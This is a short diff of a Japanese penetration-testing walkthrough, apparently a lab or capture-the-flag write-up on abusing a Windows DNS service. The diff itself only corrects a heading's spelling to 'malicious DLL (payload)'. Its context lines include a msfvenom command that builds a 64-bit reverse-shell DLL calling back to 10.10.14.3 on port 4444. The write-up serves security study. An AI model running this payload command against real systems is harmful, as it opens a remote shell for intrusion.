@@ -55,7 +55,7 @@ SERVICE_NAME: dns
         WAIT_HINT          : 0x0
 ```
 
-#### マルシャルdll（ペイロード）の作成：
+#### マリシャスdll（ペイロード）の作成：
 
 ```
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f dll --platform windows -o rev.dll
